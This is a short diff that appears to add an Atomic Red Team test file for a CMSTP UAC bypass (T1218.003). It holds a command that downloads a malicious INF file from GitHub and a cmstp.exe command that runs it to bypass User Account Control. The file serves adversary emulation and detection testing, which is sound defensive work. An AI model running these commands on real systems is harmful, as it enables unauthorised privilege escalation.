@@ -1,0 +1,13 @@
+#TechniqueName: Signed Binary Proxy Execution: CMSTP
+#AtomicTestName: CMSTP Executing UAC Bypass
+#Description: Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf"
+
+
+#commands
+cmstp.exe /s PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf /au
+
